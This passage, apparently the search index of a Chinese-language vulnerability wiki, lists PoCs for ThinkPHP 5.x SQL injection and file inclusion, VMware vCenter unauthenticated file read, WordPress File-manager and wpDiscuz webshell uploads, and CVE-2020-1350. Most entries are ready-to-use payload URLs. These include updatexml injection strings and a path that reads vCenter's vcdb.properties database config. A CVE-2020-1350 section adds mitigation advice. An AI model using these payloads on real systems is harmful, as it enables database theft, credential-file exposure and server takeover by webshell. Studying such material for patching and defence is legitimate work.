\u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u53c2\u8003\u4ee5\u4e0b\u94fe\u63a5\u5b89\u88c5\u8865\u4e01\u66f4\u65b0\uff1ahttps://www.teamviewer.com/en/download/previous-versions/","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.%280-21%29%265.1.%283-25%29sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.0.0 <= ThinkPHP <= 5.0.21 5.1.3 <= ThinkPHP <= 5.1.25 \u6f0f\u6d1ePOC \u00b6 5.0.0~5.0.21 \u3001 5.1.3\uff5e5.1.10 http://********/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 ** 5.1.11\uff5e5.1.25 http://********/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23","title":"Thinkphp 5.0.(0-21)&5.1.(3-25)sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.%280-21%29%265.1.%283-25%29sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"5.0.0 <= ThinkPHP <= 5.0.21 5.1.3 <= ThinkPHP <= 5.1.25","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.%280-21%29%265.1.%283-25%29sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"5.0.0~5.0.21 \u3001 5.1.3\uff5e5.1.10 http://********/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 ** 5.1.11\uff5e5.1.25 http://********/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.%2813-15%29%265.1.%280-5%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.0.13<=ThinkPHP<=5.0.15 5.1.0<=ThinkPHP<=5.1.5 \u6f0f\u6d1ePOC \u00b6 \u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f``` http:// * **/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1","title":"Thinkphp 5.0.(13-15)&5.1.(0-5) sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.%2813-15%29%265.1.%280-5%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"5.0.13<=ThinkPHP<=5.0.15 5.1.0<=ThinkPHP<=5.1.5","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.%2813-15%29%265.1.%280-5%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"\u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f``` http:// * **/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.0.7<=ThinkPHP5<=5.0.22 5.1.0<=ThinkPHP<=5.1.30 \u6f0f\u6d1ePOC \u00b6 POC","title":"Thinkphp 5.0.(7-22)&5.1.(0-30)\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"5.0.7<=ThinkPHP5<=5.0.22 5.1.0<=ThinkPHP<=5.1.30","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"POC","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 ThinkPHP=5.0.10 \u6f0f\u6d1ePOC \u00b6","title":"Thinkphp 5.0.10 sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"ThinkPHP=5.0.10","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.%2816-22%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.1.16 <= ThinkPHP <= 5.1.22 \u6f0f\u6d1ePOC \u00b6 http://********/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1","title":"Thinkphp 5.1.(16-22) sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.%2816-22%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"5.1.16 <= ThinkPHP <= 5.1.22","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.%2816-22%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"http://********/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.%286-8%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.1.6<=ThinkPHP<=5.1.7 \u975e\u6700\u65b0\u72485.1.8 \u6f0f\u6d1ePOC \u00b6 \u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f``` http:// * */index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0","title":"Thinkphp 5.1.(6-8) sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.%286-8%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"5.1.6<=ThinkPHP<=5.1.7 \u975e\u6700\u65b0\u72485.1.8","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.%286-8%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"\u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f``` http:// * */index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/","text":"\u5b89\u88c5docker\u73af\u5883 \u00b6 \u70b9\u51fb\u67e5\u770b\u6559\u7a0b \u00b6 \u4e0b\u8f7dvulhub\u9879\u76ee \u00b6 \u9879\u76ee\u5730\u5740\uff1a https://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/5-rce\u76ee\u5f55\uff1a cd vunhub-master/thinkphp/5-rce \u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose up -d \u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668 ip:8080 \u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01 \u00b6","title":"Thinkphp 5.x\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u73af\u5883"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#docker","text":"","title":"\u5b89\u88c5docker\u73af\u5883"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#_1","text":"","title":"\u70b9\u51fb\u67e5\u770b\u6559\u7a0b"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#vulhub","text":"\u9879\u76ee\u5730\u5740\uff1a https://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/5-rce\u76ee\u5f55\uff1a cd vunhub-master/thinkphp/5-rce \u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose up -d \u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668 ip:8080","title":"\u4e0b\u8f7dvulhub\u9879\u76ee"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#_2","text":"","title":"\u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 5.0.0 <= Thinkphp <= 5.0.18 5.1.0 <= ThinkPHP <= 5.1.10 \u6f0f\u6d1ePOC \u00b6 http://**********/index/index/index?cacheFile=1.jpg","title":"Thinkphp5\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#_1","text":"5.0.0 <= Thinkphp <= 5.0.18 5.1.0 <= ThinkPHP <= 5.1.10","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/Thinkphp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#poc","text":"http://**********/index/index/index?cacheFile=1.jpg","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/VMware/VMware%20vCenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"VMware vCenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-10-14 11:26:15 Poc: http://x.x.x.x/eam/vib?id=c:\\programData\\Vmware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properti \u539f\u6587\u94fe\u63a5\uff1a https://twitter.com/ptswarm/status/1316016337550938122","title":"VMware vCenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"Web%E5%AE%89%E5%85%A8/VMware/VMware%20vCenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#vmware-vcenter","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-10-14 11:26:15 Poc: http://x.x.x.x/eam/vib?id=c:\\programData\\Vmware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properti \u539f\u6587\u94fe\u63a5\uff1a https://twitter.com/ptswarm/status/1316016337550938122","title":"VMware vCenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"Web%E5%AE%89%E5%85%A8/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u5fae\u8f6f\u5b98\u65b9 \u53d1\u5e03\u4e86 Windows DNS Server \u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-1350\uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a\u4e25\u91cd\u3002 Windows DNS Server\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u5411\u53d7\u5f71\u54cd\u670d\u52a1\u5668\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u5f71\u54cd \u5f71\u54cd\u8303\u56f4 \u00b6 Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core inastallation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server version 1909 (Server Core installation) Windows Server version 1903 (Server Core installation) Windows Server version 2004 (Server Core installation) \u4fee\u590d\u5efa\u8bae \u00b6 \u5fae\u8f6f\u63d0\u4f9b\u4e86\u4e34\u65f6\u7684\u7f13\u89e3\u63aa\u65bd\uff1a \u4fee\u6539\u6ce8\u518c\u8868 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \u503c\uff1aTcpReceivePacketSize \u6570\u636e\u7c7b\u578b DWORD = 0xFF00 \u6ce8\u610f\uff1a\u5fc5\u987b\u91cd\u65b0\u542f\u52a8 DNS \u670d\u52a1\u624d\u80fd\u751f\u6548\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 KB4569509\uff1aDNS \u670d\u52a1\u5668\u6f0f\u6d1e CVE-2020-1350 \u6307\u5357 https://support.microsoft.com/zh-cn/help/4569509/windows-dns-server-remote-code-execution-vulnerability \u82e5\u8981\u79fb\u9664\u6b64\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a \u00b6 \u5e94\u7528\u4fee\u8865\u7a0b\u5e8f\u540e\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u79fb\u9664\u503c TcpReceivePacketSize \u53ca\u5176\u6570\u636e\uff0c\u4ee5\u4f7f\u6ce8\u518c\u8868\u9879 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \u4e0b\u7684\u6240\u6709\u5176\u4ed6\u5185\u5bb9\u4e0e\u4e4b\u524d\u4fdd\u6301\u76f8\u540c\u3002 \u624b\u52a8\u5347\u7ea7\u65b9\u6848\uff1a \u00b6 \u901a\u8fc7\u5982\u4e0b\u94fe\u63a5\u81ea\u884c\u5bfb\u627e\u7b26\u5408\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u7684\u6f0f\u6d1e\u8865\u4e01\uff0c\u5e76\u8fdb\u884c\u8865\u4e01\u4e0b\u8f7d\u5b89\u88c5\u3002 CVE-2020-1350 | Windows DNS \u670d\u52a1\u5668\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1350 POC \u00b6 CVE-2020-1350-master \u6765\u6e90 \u00b6 https://www.cnvd.org.cn/flaw/show/CNVD-2020-51784","title":"CVE-2020-1350 Windows DNS Server\u8815\u866b\u7ea7\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"\u5fae\u8f6f\u5b98\u65b9 \u53d1\u5e03\u4e86 Windows DNS Server \u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-1350\uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a\u4e25\u91cd\u3002 Windows DNS Server\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u5411\u53d7\u5f71\u54cd\u670d\u52a1\u5668\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u5f71\u54cd","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"Web%E5%AE%89%E5%85%A8/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core inastallation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server version 1909 (Server Core installation) Windows Server version 1903 (Server Core installation) Windows Server version 2004 (Server Core installation)","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"\u5fae\u8f6f\u63d0\u4f9b\u4e86\u4e34\u65f6\u7684\u7f13\u89e3\u63aa\u65bd\uff1a \u4fee\u6539\u6ce8\u518c\u8868 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \u503c\uff1aTcpReceivePacketSize \u6570\u636e\u7c7b\u578b DWORD = 0xFF00 \u6ce8\u610f\uff1a\u5fc5\u987b\u91cd\u65b0\u542f\u52a8 DNS \u670d\u52a1\u624d\u80fd\u751f\u6548\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 KB4569509\uff1aDNS \u670d\u52a1\u5668\u6f0f\u6d1e CVE-2020-1350 \u6307\u5357 https://support.microsoft.com/zh-cn/help/4569509/windows-dns-server-remote-code-execution-vulnerability","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","text":"\u5e94\u7528\u4fee\u8865\u7a0b\u5e8f\u540e\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u79fb\u9664\u503c TcpReceivePacketSize \u53ca\u5176\u6570\u636e\uff0c\u4ee5\u4f7f\u6ce8\u518c\u8868\u9879 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \u4e0b\u7684\u6240\u6709\u5176\u4ed6\u5185\u5bb9\u4e0e\u4e4b\u524d\u4fdd\u6301\u76f8\u540c\u3002","title":"\u82e5\u8981\u79fb\u9664\u6b64\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","text":"\u901a\u8fc7\u5982\u4e0b\u94fe\u63a5\u81ea\u884c\u5bfb\u627e\u7b26\u5408\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u7684\u6f0f\u6d1e\u8865\u4e01\uff0c\u5e76\u8fdb\u884c\u8865\u4e01\u4e0b\u8f7d\u5b89\u88c5\u3002 CVE-2020-1350 | Windows DNS \u670d\u52a1\u5668\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1350","title":"\u624b\u52a8\u5347\u7ea7\u65b9\u6848\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"CVE-2020-1350-master","title":"POC"},{"location":"Web%E5%AE%89%E5%85%A8/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","text":"https://www.cnvd.org.cn/flaw/show/CNVD-2020-51784","title":"\u6765\u6e90"},{"location":"Web%E5%AE%89%E5%85%A8/WordPress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"https://www.anquanke.com/post/id/216990 \u76f8\u4fe1\u2f24\u5bb6\u5bf9Wordpress\u5e76\u4e0d\u964c\u2f63;File-manager\u63d2\u4ef6\u4e5f\u662f\u76f8\u5f53\u2f55\u7206\u524d\u6bb5\u65f6\u95f4\u7206\u51fa\u4efb\u610f\u2f42\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 \u6210\u529f\u4e0a\u4f20\u540e\u2f42\u4ef6\u8bbf\u95ee\u8def\u5f84 ip/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php","title":"Wordpress File-manager\u4efb\u610f\u2f42\u4ef6\u4e0a\u4f20"},{"location":"Web%E5%AE%89%E5%85%A8/WordPress/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"WordPress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-24 20:49:39 \u6f0f\u6d1e\u63cf\u8ff0 wordpress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u6ca1\u6709\u5b89\u88c5wpDiscuz\u63d2\u4ef6\u662f\u6ca1\u6709\u6b64\u6f0f\u6d1e\u7684\u3002 \u5f71\u54cd\u8303\u56f4 wpDiscuz v7.0.0-v7.0.4 \u73af\u5883\u642d\u5efa https://cn.wordpress.org/latest-zh_CN.zip https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip \u7ba1\u7406\u5458\u767b\u5f55\uff0c\u5728\u63d2\u4ef6\u6a21\u5757\u5b89\u88c5wpdiscuz\u63d2\u4ef6\uff0c\u5373\u53ef\u770b\u5230\u8bc4\u8bba\u754c\u9762\u53d8\u6210\u8fd9\u4e2a\u6837\u5b50\uff0c\u70b9\u51fb\u56fe\u7247\u7684\u5c0f\u6807\u53ef\u4e0a\u4f20\u56fe\u7247\u3002 \u6f0f\u6d1epoc poc (2) \u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u4fee\u6539\u4e3aGTF\u5934 \u8681\u5251\u8fde\u63a5\u6210\u529f","title":"WordPress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/WordPress/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#wordpresswpdiscuz","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-24 20:49:39 \u6f0f\u6d1e\u63cf\u8ff0 wordpress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u6ca1\u6709\u5b89\u88c5wpDiscuz\u63d2\u4ef6\u662f\u6ca1\u6709\u6b64\u6f0f\u6d1e\u7684\u3002 \u5f71\u54cd\u8303\u56f4 wpDiscuz v7.0.0-v7.0.4 \u73af\u5883\u642d\u5efa https://cn.wordpress.org/latest-zh_CN.zip https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip 